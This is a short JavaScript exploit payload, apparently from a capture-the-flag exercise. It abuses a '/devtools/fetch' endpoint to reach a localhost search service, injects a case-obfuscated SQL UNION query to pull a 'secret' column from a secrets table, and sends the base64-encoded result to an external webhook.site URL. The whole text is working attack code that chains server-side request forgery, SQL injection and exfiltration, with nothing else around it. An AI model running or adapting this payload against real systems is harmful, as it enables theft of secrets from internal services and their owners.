fetch('/devtools/fetch', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    url: "http://127.0.0.1:8080/search?q=' UnIoN SeLeCt 1,secret,3,4 FrOm secrets/*"
  })
})
.then(r => r.json())
.then(d => {
  fetch('https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?flag=' + btoa(d.body));
});
